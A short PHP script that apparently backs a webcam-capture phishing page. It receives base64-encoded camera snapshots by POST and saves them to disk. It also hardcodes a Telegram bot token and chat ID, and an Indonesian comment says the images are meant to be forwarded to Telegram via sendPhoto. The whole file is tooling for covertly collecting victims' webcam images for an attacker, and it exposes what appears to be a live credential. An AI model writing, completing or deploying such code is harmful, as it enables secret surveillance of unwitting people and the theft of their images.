<?php
$botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
$chatId = "8753510792";
$imageData = $_POST['image'] ?? '';
$imageData = str_replace('data:image/png;base64,', '', $imageData);
$imageData = base64_decode($imageData);
file_put_contents('webcam_' . time() . '.png', $imageData);
// Kirim ke telegram via sendPhoto (perlu setup lebih lanjut)
?>